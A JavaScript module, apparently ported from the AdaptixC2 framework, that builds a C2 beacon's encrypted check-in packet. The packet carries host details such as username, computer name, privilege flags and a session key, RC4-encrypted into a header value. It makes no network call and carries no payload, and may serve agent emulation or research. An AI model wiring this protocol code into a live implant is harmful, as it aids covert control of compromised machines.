// Ported from AdaptixC2 (https://github.com/Adaptix-Framework/AdaptixC2),
// AdaptixServer/extenders/beacon_agent/src_beacon/beacon/MainAgent.cpp BuildBeat + Packer.cpp (beat layout) — GPLv3, (c) the
// AdaptixC2 authors. Structural fidelity is deliberate; deviations are noted inline.
// beat.js — build the Adaptix beacon beat exactly per Agent::BuildBeat + Packer.cpp.
//   beatPlain (BE): agent_type | agent_id | sleep | jitter | kill | working |
//     acp(u16) | oemcp(u16) | gmt_off(i8) | pid(u16) | tid(u16) | build(u32) |
//     major(u8) | minor(u8) | internal_ip(u32) | flag(u8) |
//     PackBytes(sessionKey=16 rnd) | PackStringA(domain/computer/username/process)
//   beatSent  = RC4(beatPlain, encrypt_key[16]);
//   headerVal = base64(beatSent)
const crypto = require('crypto');
const { Packer } = require('./packer');
const { rc4 } = require('./rc4');

function buildFlag(info) {
   // C++: flag += is_server; flag<<=1; flag+=elevated; flag<<=1; flag+=sys64; flag<<=1; flag+=arch64
  let f = 0;
  f = ((f + (info.is_server ? 1 : 0)) << 1) + (info.elevated ? 1 : 0);
  f = ((f << 1) + (info.sys64 ? 1 : 0));
  f = ((f << 1) + (info.arch64 ? 1 : 0));
  return f & 0xff;
}

function swap32(v) {
  v = v >>> 0;
  return (((v & 0xff) << 24) | ((v & 0xff00) << 8) | ((v >>> 8) & 0xff00) | ((v >>> 24) & 0xff)) >>> 0;
}

// Returns { headerValue, sessionKey(16 bytes as Buffer), beatPlain, agentInfo }.
// Pass fixedKey to reuse one session key across ticks: the server only reads the
// key at registration, so later beats must keep carrying the SAME key.
function buildBeat(cfg, info, fixedKey) {
  const key = Buffer.from(cfg.encrypt_key, 'hex'); // 16 bytes
  const sessionKey = fixedKey || crypto.randomBytes(16);

  const p = new Packer();
  p.pack32(cfg.agent_type >>> 0)   // 0xbe4c0149
   .pack32(cfg.agent_id >>> 0)
   .pack32(cfg.sleep_delay >>> 0)
   .pack32(cfg.jitter_delay >>> 0)
   .pack32(0 >>> 0)                // kill_date (0 = none)
   .pack32(0 >>> 0)                // working_time (0 = none)
   .pack16(info.acp & 0xffff)
   .pack16(info.oemcp & 0xffff)
   .pack8(((info.gmt_offset) | 0) & 0xff)
   .pack16((info.pid || 0) & 0xffff)
   .pack16((info.tid || 0) & 0xffff)
   .pack32((info.build_number || 0) >>> 0)
   .pack8(info.major_version & 0xff)
   .pack8(info.minor_version & 0xff)
   // internal_ip: the real C++ beacon gets the IP as a Windows host-order DWORD
   // (inet_addr network bytes in an LE ULONG), so on the wire the octets are
   // reversed vs. what Pack32(BE) would write. Byte-swap to match, or the server
   // console displays the IP backwards.
   .pack32(swap32(parseInt(info.internal_ip, 10) || 0))
   .pack8(buildFlag(info))
   .packBytes(sessionKey, 16)
   .packStringA(info.domain_name)
   .packStringA(info.computer_name)
   .packStringA(info.username)
   .packStringA(info.process_name);

  const plain = p.data();
  const enc = rc4(plain, key);
  const headerValue = enc.toString('base64');

  return { headerValue, sessionKey, beatPlain: plain, agentType: cfg.agent_type, agentId: cfg.agent_id };
}

module.exports = { buildBeat, buildFlag };
